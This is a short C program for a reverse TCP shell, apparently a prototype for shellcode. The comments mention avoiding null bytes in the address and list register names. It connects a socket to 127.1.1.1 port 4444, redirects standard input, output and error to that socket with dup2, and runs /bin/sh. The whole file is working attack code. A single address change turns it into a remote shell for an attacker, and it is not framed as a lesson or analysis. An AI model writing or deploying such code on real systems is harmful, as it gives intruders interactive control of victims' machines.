#include <stdlib.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <stdlib.h>

/*
int connect(int sockfd, const struct sockaddr *addr,socklen_t addrlen);

man ip:
struct sockaddr_in {
    short            sin_family;   // address family
    unsigned short   sin_port;     // port in network byte order
    struct in_addr   sin_addr; 	   // internet address
};

struct in_addr {
    uint32_t s_addr;  	   // address in network byte order
};

man socket => AF_INET      IPv4 Internet protocols                    ip(7)
man ip => tcp_socket = socket(AF_INET, SOCK_STREAM, 0);

uint16_t htons(uint16_t hostshort);

int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
int dup2(int oldfd, int newfd);
*/

int main()
{
	// 0 stands for default protocol
	int sock = socket(AF_INET, SOCK_STREAM, 0);

	// defines target address:
	struct sockaddr_in addr;
	addr.sin_family = AF_INET;
	addr.sin_port = htons(4444);
	// dont use 127.0.0.1 to avoid null bytes:
	addr.sin_addr.s_addr = inet_addr("127.1.1.1");
	
	// connect to target:
	connect(sock, (struct sockaddr *) &addr, sizeof(addr));
	
	// redirect standard input, output and error to the socket sock:
	dup2(sock, 0);
	dup2(sock, 1);
	dup2(sock, 2);

	execve("/bin/sh", NULL, NULL);
	// RAX    EBX      ECX   EDX

	return 0;
}
